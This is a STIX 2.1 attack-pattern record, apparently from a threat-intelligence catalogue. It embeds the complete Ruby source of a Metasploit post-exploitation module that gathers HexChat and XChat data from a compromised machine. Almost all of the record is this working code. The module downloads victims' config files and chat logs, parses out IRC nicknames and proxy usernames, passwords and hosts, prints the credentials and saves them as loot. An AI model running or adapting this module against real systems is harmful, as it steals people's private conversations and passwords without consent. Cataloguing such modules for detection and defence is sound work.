{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a393b2cb-747d-454c-8c3a-3ea091c85d2b",
    "created": "2024-08-14T16:33:19.16758Z",
    "modified": "2024-08-14T16:33:19.167584Z",
    "name": "Linux Gather HexChat/XChat Enumeration",
    "description": " This module will collect HexChat and XChat's config files and chat logs from the victim's machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The CONFIGS option can be used to collect information such as channel settings channel/server passwords, etc.  The CHATS option will simply download all the .log files.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/enum_hexchat.rb",
            "external_id": "enum_hexchat.rb"
        },
        {
            "source_name": "reference",
            "url": "https://hexchat.readthedocs.io/en/latest/settings.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Exploit::Deprecated\n\n  moved_from 'post/linux/gather/enum_xchat'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather HexChat/XChat Enumeration',\n        'Description' => %q{\n          This module will collect HexChat and XChat's config files and chat logs from the victim's\n          machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The\n          CONFIGS option can be used to collect information such as channel settings,\n          channel/server passwords, etc.  The CHATS option will simply download all the\n          .log files.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['sinn3r', 'h00die'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Actions' => [\n          ['CONFIGS', { 'Description' => 'Collect config files' } ],\n          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],\n          ['ALL', { 'Description' => 'Collect both the configs and chat logs' }]\n        ],\n        'DefaultAction' => 'ALL',\n        'References' => [\n          ['URL', 'https://hexchat.readthedocs.io/en/latest/settings.html']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptBool.new('HEXCHAT', [false, 'Enumerate hexchat', true ]),\n      OptBool.new('XCHAT', [false, 'Enumerate xchat', false ])\n    ])\n  end\n\n  def whoami\n    cmd_exec('/usr/bin/whoami').chomp\n  end\n\n  def sep\n    if session.platform == 'windows'\n      return '\\\\'\n    else\n      return '/'\n    end\n  end\n\n  def get_paths(mode = 'HEXCHAT')\n    paths = []\n    if session.platform == 'windows'\n      appdata = get_env('APPDATA')\n      if mode == 'HEXCHAT'\n        paths << \"#{appdata}\\\\HexChat\\\\\"\n      elsif datastore['XCHAT']\n        paths << \"#{appdata}\\\\X-Chat 2\\\\\"\n      end\n    else\n      user = whoami\n      fail_with(Failure::Unknown, 'Unable to get username.') if user.blank?\n      vprint_status(\"Detcted username: #{user}\")\n\n      if mode == 'HEXCHAT'\n        # https://hexchat.readthedocs.io/en/latest/settings.html\n        paths << \"/home/#{user}/.config/hexchat/\"\n      elsif mode == 'XCHAT'\n        paths << \"/home/#{user}/.xchat2/\"\n      end\n    end\n    paths\n  end\n\n  def list_logs(base, mode = 'HEXCHAT')\n    files = []\n    if mode == 'HEXCHAT'\n      # hexchat has a folder for each server\n      # inside each folder, like 'freenode'\n      # are files: sever.log, <server>.log, .log\n      folders = dir base\n      folders.each do |folder|\n        file = dir \"#{base}#{sep}#{folder}\"\n        file.each do |f|\n          if f.end_with? '.log'\n            files << \"#{base}#{sep}#{folder}#{sep}#{f}\"\n          end\n        end\n      end\n    elsif mode == 'XCHAT'\n      file = dir base\n      file.each do |f|\n        if f.end_with? '.log'\n          files << \"#{base}#{sep}#{f}\"\n        end\n      end\n    end\n    files\n  end\n\n  def save(type, data, mode = 'HEXCHAT')\n    case type\n    when :configs\n      type = \"#{mode.downcase}.config\"\n    when :chatlogs\n      type = \"#{mode.downcase}.chatlogs\"\n    end\n\n    data.each do |d|\n      fname = ::File.basename(d[:filename])\n      p = store_loot(\n        type,\n        'text/plain',\n        session,\n        d[:data],\n        fname\n      )\n      print_good(\"#{fname} saved as #{p}\")\n    end\n  end\n\n  def get_chatlogs(base, mode = 'HEXCHAT')\n    logs = []\n\n    case mode\n    when 'XCHAT'\n      base_logs = \"#{base}#{sep}xchatlogs\"\n    when 'HEXCHAT'\n      base_logs = \"#{base}#{sep}logs\"\n    else\n      vprint_error(\"Invalid mode: #{mode}\")\n      return logs\n    end\n    unless directory? base_logs\n      vprint_error(\"Chat logs not found at #{base_logs}\")\n      return logs\n    end\n    list_logs(base_logs, mode).each do |l|\n      vprint_status(\"Downloading: #{l}\")\n      data = read_file(l)\n      logs << {\n        filename: l,\n        data: data\n      }\n    end\n    logs\n  end\n\n  def parse_config(conf)\n    if conf =~ /^irc_user_name = (.+)$/\n      print_good \"IRC nick: #{Regexp.last_match(1)}\"\n    end\n    if conf =~ /^irc_nick1 = (.+)$/\n      print_good \"IRC nick1: #{Regexp.last_match(1)}\"\n    end\n    if conf =~ /^irc_nick2 = (.+)$/\n      print_good \"IRC nick2: #{Regexp.last_match(1)}\"\n    end\n    if conf =~ /^irc_nick3 = (.+)$/\n      print_good \"IRC nick3: #{Regexp.last_match(1)}\"\n    end\n    /^net_proxy_user = (?<proxyuser>.+)$/ =~ conf\n    /^net_proxy_pass = (?<proxypass>.+)$/ =~ conf\n    /^net_proxy_host = (?<proxyhost>.+)$/ =~ conf\n    /^net_proxy_port = (?<proxyport>.+)$/ =~ conf\n    unless proxypass.blank? || proxyuser.blank? || proxyhost.blank? || proxyport.blank?\n      proxyhost.strip!\n      proxyport.strip!\n      proxyuser.strip!\n      proxypass.strip!\n      print_good(\"Proxy conf: #{proxyhost}:#{proxyport} -> #{proxyuser}/#{proxypass}\")\n      create_credential_and_login({\n        address: proxyhost,\n        port: proxyport,\n        protocol: 'tcp',\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        private_type: :password,\n        private_data: proxypass,\n        public_data: proxyuser,\n        service_name: 'proxy',\n        module_fullname: fullname,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n    end\n  end\n\n  def get_configs(base, mode = 'HEXCHAT')\n    config = []\n    files = []\n    if mode == 'XCHAT'\n      files = ['servlist_.conf', 'xchat.conf']\n    elsif mode == 'HEXCHAT'\n      files = ['servlist.conf', 'hexchat.conf']\n    end\n    files.each do |f|\n      conf = base + f\n      unless file? conf\n        vprint_error(\"File not found: #{conf}\")\n        next\n      end\n      vprint_good(\"Downloading: #{conf}\")\n      buf = read_file(conf)\n      next if buf.blank?\n\n      if conf.end_with? 'chat.conf'\n        parse_config buf\n      end\n      config << {\n        filename: f,\n        data: buf\n      }\n    end\n\n    config\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Please specify an action.') if action.nil?\n\n    if datastore['XCHAT']\n      get_paths('XCHAT').each do |base|\n        unless directory? base\n          print_error(\"XChat not installed or used by user. #{base} not found.\")\n        end\n\n        configs = get_configs(base, 'XCHAT') if action.name =~ /ALL|CONFIGS/i\n        chatlogs = get_chatlogs(base, 'XCHAT') if action.name =~ /ALL|CHATS/i\n\n        save(:configs, configs, 'XCHAT') unless configs.blank?\n        save(:chatlogs, chatlogs, 'XCHAT') unless chatlogs.blank?\n      end\n    end\n\n    if datastore['HEXCHAT']\n      get_paths.each do |base|\n        unless directory? base\n          print_error(\"HexChat not installed or used by user. #{base} not found.\")\n        end\n\n        configs = get_configs(base) if action.name =~ /ALL|CONFIGS/i\n        chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i\n\n        save(:configs, configs) unless configs.blank?\n        save(:chatlogs, chatlogs) unless chatlogs.blank?\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}